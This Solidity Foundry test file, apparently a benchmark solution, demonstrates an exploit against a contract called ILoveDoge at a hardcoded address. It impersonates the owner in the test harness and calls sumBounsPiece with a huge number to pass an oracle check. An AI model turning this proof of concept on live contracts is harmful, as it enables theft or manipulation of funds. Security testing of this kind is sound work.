import "forge-std/Test.sol";

interface ILoveDoge {
    function owner() external view returns (address);
    function getDays() external view returns (string memory, string memory);
    function sumBounsPiece(string memory yesToday, uint256 num) external returns (bool);
    function dayPoolBounsPiece(string calldata) external view returns (uint256);
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────

    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        ILoveDoge contractInstance = ILoveDoge(TARGET);

        // 1. Dynamically fetch the owner of the deployed contract instead of hardcoding it.
        address contractOwner = contractInstance.owner();

        // Advance time to ensure date calculations are correct for the exploit.
        vm.warp(block.timestamp + 1 days);

        // Impersonate the correct owner to call the privileged function.
        vm.startPrank(contractOwner);

        // 2. Get the string for "yesterday".
        (string memory yesterday, ) = contractInstance.getDays();

        // 3. Call sumBounsPiece with a huge number to exploit the vulnerability.
        // The oracle requires a value > 10**50. The function multiplies this by 10**9.
        // So, we provide 10**50, which becomes 10**59, satisfying the check.
        uint256 maliciousNum = 10**50;
        contractInstance.sumBounsPiece(yesterday, maliciousNum);

        vm.stopPrank();
    }



    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

